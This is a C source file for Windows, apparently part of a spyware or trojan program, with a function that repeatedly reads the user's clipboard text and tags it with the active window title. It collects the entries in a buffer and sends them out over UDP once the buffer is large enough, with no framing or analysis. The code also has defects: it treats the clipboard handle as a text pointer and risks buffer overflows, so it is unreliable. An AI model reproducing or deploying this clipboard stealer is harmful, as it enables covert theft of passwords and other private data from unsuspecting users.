#include "Stdafx.h"

extern char clipboard_buffer[CLIPBOARD_SIZE*2];

void check_clipboard(void)
{
	static char previnfo[128];
	char temp[1024];
	HWND acthwnd;
	char title[1024];
	int result;
	int cliplen;
	HANDLE data;

	result = OpenClipboard(NULL);
	if(result==0)
	{
		deb("failed to open clipboard: %s", FORMATERROR);
		return;
	}

	result = IsClipboardFormatAvailable(CF_TEXT);
	if(result==0)
	{
		//		deb("no CF_TEXT info in clipboard.");
	}

	result = IsClipboardFormatAvailable(CF_UNICODETEXT);
	if(result==0)
	{
		//	deb("no CF_UNICODETEXT info in clipboard.");
		CloseClipboard();
		return;
	}

	data = GetClipboardData(CF_TEXT);
	GlobalLock(data);
	cliplen = strlen((char*)data);

	if(cliplen>CLIPBOARD_MIN && cliplen<CLIPBOARD_MAX)
	{
		if(strcmp(previnfo, (char*)data)!=0)
		{
			strncpy(previnfo, (char*)data, sizeof(previnfo));

			SetUserDesktop(1);
			acthwnd = GetForegroundWindow();

			GetWindowText(acthwnd, title, sizeof(title));

			SetUserDesktop(0);

			wsprintf(temp, "%s -> %s\n", title, previnfo);
			strcat(clipboard_buffer, temp);

			deb("new clipboard buffer: \n%s", clipboard_buffer);
		}
	}
	GlobalUnlock(data);
	CloseClipboard();

	if(strlen(clipboard_buffer)>CLIPBOARD_SIZE)
	{
		deb("sending clipboard data... %d bytes", strlen(clipboard_buffer));
		udp_submit_clipboard(clipboard_buffer);
		memset(clipboard_buffer, 0, sizeof(clipboard_buffer));
	}

	return;
}